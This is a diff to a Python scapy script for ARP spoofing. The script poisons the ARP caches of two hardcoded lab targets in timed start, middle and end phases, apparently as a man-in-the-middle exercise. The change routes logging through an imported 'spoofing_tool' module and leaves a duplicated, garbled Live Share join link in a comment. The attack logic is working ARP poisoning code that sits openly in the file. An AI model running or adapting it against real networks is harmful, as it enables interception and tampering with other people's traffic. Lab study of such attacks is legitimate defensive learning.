@@ -1,8 +1,10 @@
 from scapy.all import *
+import spoofing_tool as spoof
 import time
+import sys
 
 # Hardcoded for now
-# https://prod.liveshare.vsengsaas.visualstudio.com/join?EE5AD55B6EBF068194A2BCB375C1A307EF78
+# https://prod.liveshare.vsengsaas.visualstudio.com/join?EE5AD55B6EBF068194A2BCB375C1A307EF78https://prod.liveshare.vsengsaas.visualstudio.com/join?EE5AD55B6EBF068194A2BCB375C1A307EF78
 
 # target one details
 g_macT1 = "08:00:27:b7:c4:af"
@@ -28,13 +30,13 @@ ONE_WAY_TOKEN = "ONE_WAY_TOKEN_abfjdfsldf"
 
 # main function
 def arp_spoofing(macT1, ipT1, macT2, ipT2, macAtk, ipAtk, iface):
-    print("Begin start procedure")
+    spoof.printf("Begin start procedure")
     poison_m_times_every_n_secs(start_count, start_interval, time.time() - start_interval, True, macT1, ipT1, macT2, ipT2, macAtk, ipAtk, iface, 1)
 
-    print("Begin middle procedure")
+    spoof.printf("Begin middle procedure")
     poison_m_times_every_n_secs(middle_count, middle_interval, time.time(), True, macT1, ipT1, macT2, ipT2, macAtk, ipAtk, iface, 2)
 
-    print("Begin end procedure")
+    spoof.printf("Begin end procedure")
     poison_m_times_every_n_secs(end_count, end_interval, time.time() - end_interval, False, macT1, ipT1, macT2, ipT2, macAtk, ipAtk, iface, 2)
 
 
@@ -47,7 +49,7 @@ def one_way_arp(macT1, ipT1, ipT2, macAtk, ipAtk, iface, pkt_type):
 def poison_m_times_every_n_secs(m, n, last_sent_time, should_poison, macT1, ipT1, macT2, ipT2, macAtk, ipAtk, iface, pkt_type):
     while m > 0:
         if time.time() - last_sent_time > n:
-            print(m)
+            spoof.printf(m)
             if should_poison:
                 arp_poison(macT1, ipT1, macT2, ipT2, macAtk, ipAtk, iface, pkt_type)
             else:
